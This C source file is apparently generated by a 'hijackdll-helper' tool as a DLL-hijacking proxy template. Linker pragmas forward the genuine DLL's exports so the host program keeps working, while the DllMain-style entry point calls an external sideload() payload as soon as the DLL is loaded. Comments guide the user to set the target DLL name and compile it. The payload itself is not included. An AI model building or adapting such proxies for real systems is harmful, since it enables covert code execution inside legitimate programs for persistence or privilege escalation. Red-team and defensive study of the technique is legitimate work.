// Created by hijackdll-helper
/* There should be dll hijacking possible first! */
/* cl.exe /Os /GD /LD /Fe */
/* https://en.wikipedia.org/wiki/Name_mangling */

#include <windows.h>

/*  Don't forward to itself!
    "C:\Windows\System32\version" is acceptable ;p
*/
#define HIJACKED_DLL_NAME "name_mangling_"    //<--- modify

/* gcc does't support this. */
#pragma comment(linker, "/EXPORT:__e="HIJACKED_DLL_NAME"._e,@1")
#pragma comment(linker, "/EXPORT:_g@4="HIJACKED_DLL_NAME"._g@4,@2")
#pragma comment(linker, "/EXPORT:f="HIJACKED_DLL_NAME".f,@3")
#pragma comment(linker, "/EXPORT:h="HIJACKED_DLL_NAME".h,@4")


// Add your implementations here, and comment the forwarders <---

extern int sideload();    //<---

/*  Less dependencies: _DllMainCRTStartup
    More functions: DllMain
    Take care of the core libs yourself: msvcrt, kernel32, ntdll, user32 */
BOOL WINAPI _DllMainCRTStartup(HMODULE hModule, DWORD dwReason, PVOID pvReserved)
{
	switch (dwReason) {
	case DLL_PROCESS_ATTACH:
		sideload();    //<---
		break;
    /*
	case DLL_PROCESS_DETACH:
        break;
	case DLL_THREAD_ATTACH:
        break;
	case DLL_THREAD_DETACH:
        break;
    */
	}
	return TRUE;
}
